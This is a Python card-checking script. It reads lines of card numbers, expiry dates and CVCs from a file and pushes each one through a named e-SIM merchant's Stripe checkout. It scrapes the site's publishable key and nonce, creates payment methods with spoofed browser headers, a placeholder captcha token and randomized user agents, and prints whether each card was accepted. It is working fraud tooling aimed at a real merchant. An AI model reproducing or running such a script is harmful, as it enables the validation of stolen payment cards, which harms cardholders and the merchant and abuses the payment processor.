import requests,random,time
from user_agent import generate_user_agent
file=open('cc.txt',"+r")
nm = 0
for P in file.readlines():
	nm += 1
	n = P.split('|')[0]
	mm = (P.split('|')[1])
	if "0" not in mm and int(mm) <=9:
		mm = f"0{mm}"
	yy = P.split('|')[2]
	if "20" in yy:
		yy = yy[2:]
	cvc = P.split('|')[3].replace('\n', '')
	P = P.replace('\n', '')
	rnd = "".join(random.choices("1234567890",k=5))
	user=generate_user_agent()
	time.sleep(4)
	headers = {
    'authority': 'nzesims.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'referer': 'https://nzesims.com/checkout-7d3gb/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',}
	params = {
    'products[]': '41-1',
    'timestamp': f'17199{rnd}',}
	response = requests.get('https://nzesims.com/wp-json/opc/v1/cart/initialize', params=params, headers=headers)
	res = response.json()["data"]['providers']['stripe']
	pk=res['publishableKey']
	acct = res['account_id']
	pi = res["paymentIntendID"]
	name = response.json()["data"]["product"]['products'][0]["name"]
	price = response.json()["data"]["product"]['products'][0]['productPrice']
	nonce=response.json()["data"]['nonce']
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,}
	data = f'type=card&billing_details[address][country]=US&billing_details[email]=ngrokmtx%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=3bd309e1-43c0-4190-9cd2-07fa077f1b1b9ccfe3&muid=52afc386-fe7e-407c-9fad-ce4f4faa51ca09bd19&sid=623bdd5f-1868-4840-bd3f-379c83136ae51180f4&payment_user_agent=stripe.js%2Fd14cd26850%3B+stripe-js-v3%2Fd14cd26850%3B+card-element&referrer=https%3A%2F%2Fnzesims.com&time_on_page=55152&key={pk}&_stripe_account={acct}&radar_options[hcaptcha_token]=20000000-aaaa-bbbb-cccc-000000000002'
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		pm = response.json()['id']
	except:
		time.sleep(2)
		pass
	headers = {
    'authority': 'nzesims.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://nzesims.com',
    'referer': 'https://nzesims.com/checkout-7d3gb/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
    'x-wp-nonce':nonce,}
	data = {
    'emailAddress': 'ngrokmtx@gmail.com',
    'country': 'US',
    'products[]': '41-1',
    'provider[paymentProviderName]': 'stripe-test',
    'provider[paymentIntendID]': pi,
    'provider[paymentMethodId]': pm,
    'postAction': 'productSuccessUrl',
    'redirectUrl': '',
    'funnelStep': '',
    'pageId': '31',}
	response = requests.post('https://nzesims.com/wp-json/opc/v1/cart/checkout', headers=headers, data=data)
	try:
		msg = (response.json()["message"])
		clean_msg = msg.replace("Your request was in test mode, but used a non test (live) card. For a list of valid test cards, visit: https://stripe.com/docs/testing.","")
		result = f'''
Gath : Stripe Charge 
Price : {price} $
Item Neam : Esim {name}
-------------------------------------
Card : {P}
-------------------------------------
Result : {clean_msg}
-------------------------------------
By : MTX02

	
	'''
		print(result)
	except:
		time.sleep(2)
		pass
